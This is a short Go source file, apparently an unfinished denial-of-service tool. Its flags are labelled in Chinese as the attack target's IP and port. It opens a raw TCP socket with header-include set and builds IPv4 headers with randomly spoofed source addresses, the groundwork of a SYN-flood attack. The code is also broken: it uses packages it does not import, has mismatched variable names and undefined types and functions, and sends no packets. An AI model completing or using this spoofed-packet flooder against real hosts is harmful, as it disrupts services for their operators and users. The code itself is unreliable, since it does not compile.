package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"syscall"
)

func main() {
	host := flag.String("h", "", "攻击目标IP")
	port := flag.Int("p", 0, "攻击目标端口")
	flag.Parse()

	if *host == "" {
		fmt.Println("参数 h 不能为空")
		return 1
	}

	if *port == 0 {
		fmt.Println("参数 p 不能为空")
		return 1
	}

	ipv4Addr := net.ParseIP(*host).To4()
	//目前没有实现ipv6
	if ipv4Addr == nil {
		fmt.Println("参数 h 不是有效的IPv4地址")
		return 1
	}

	handle(ipv4Addr, *port)
}

func handle(ip net.IP, port int) {
	//创建原始套接字
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Println(err)
		return
	}

	//设置IP层信息，使其能够修改IP层数据
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, 0x3, 1)
	if err != nil {
		fmt.Println(err)
		return
	}

	//底层的fd转成文件对象
	file := os.NewFile(uintptr(fd), "socket")

	//文件对象转成go socket对象
	rawSocket, err := net.FilePacketConn(file)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println(rawSocket)
}

func getIPV4Header(destIp net.IP) []byte {
	rand.Seed(time.Now().UnixNano())
	srcIP := net.IP(make([]byte, 4))
	binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<32-1)))

	h := &IPV4Header{
		ID:       1,
		TTL:      255,
		Protocol: syscall.IPPROTO_TCP,
		Checksum: 0,
		Src:      srcIP,
		Dst:      destIP,
	}

	b.Checksum = int(crc16(h.Marshal()))

	return h.Marshal()
}
